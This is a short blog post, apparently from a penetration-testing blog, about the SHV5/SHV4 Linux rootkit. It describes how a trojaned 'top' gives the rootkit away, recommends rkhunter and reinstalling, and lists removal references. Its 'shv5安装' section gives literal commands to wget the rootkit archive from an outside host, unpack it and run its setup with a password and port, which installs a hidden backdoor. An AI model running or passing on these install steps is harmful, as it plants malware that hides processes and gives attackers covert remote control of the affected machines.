---
layout: post
title: "SHV5/SHV4 rootkit"
description: ""
category: 渗透测试
tags: [rootkit]
---
{% include JB/setup %}

##  发现痕迹##
On RHEL or Centos 4 or 5, If you run the linux command top and you see something like: 

"Unknown HZ value! (75) Assume 100" 

Yours might not say "75" -- it could be any number. 
If you see this, you should run rkhunter immediately, because your box has probably been taken over by a rootkit -- either SHV4 or SHV5. 

The only reason you see this clue "Unknown HZ value" is because the rootkit replaces the top command (among others) with a substitute top command that will hide its processes. Their replacement top is old (version 1.2) and cannot handle the HZ value of the 2.6 linux kernel. 
Sad to say, but if this happens to you, its time to reinstall your OS!


!!测试发现第一次安装shv5的时候,ls不会有出错信息,用脚本将rootkit清理一遍,当然不彻底,虽然rootkit失效了,但是有些残留.再次安装ls就会出现错误提示了.

## shv5安装 ##

	wget http://baributz.hourb.com/localroot/shv5.tar.gz
	tar zxvf shv5.tar.gz
	cd shv5
	./setup pass port



## 参考资料 ##

http://www.kentoyer.com/2009/12/21/removing-the-shv5-rootkit/

http://www.jigsawboys.com/2008/06/01/lead-story-test/

http://serverfault.com/questions/524723/how-can-i-remove-shv4-shv5-rootkits

http://blog.hostonnet.com/shv5-rootkit

http://www.huweb.hu/maques/mblog/?p=153

http://blog.wgzhao.com/2009/09/14/shv4-rootkit/

http://blog.evilcoder.net/remove-linux-shv5-rootkit/


http://web.fhnw.ch/plattformen/ns/vorlesungsunterlagen-1/network-analysis-tools/shv4-analysis

http://blog.csdn.net/cnbird2008/article/details/4553488
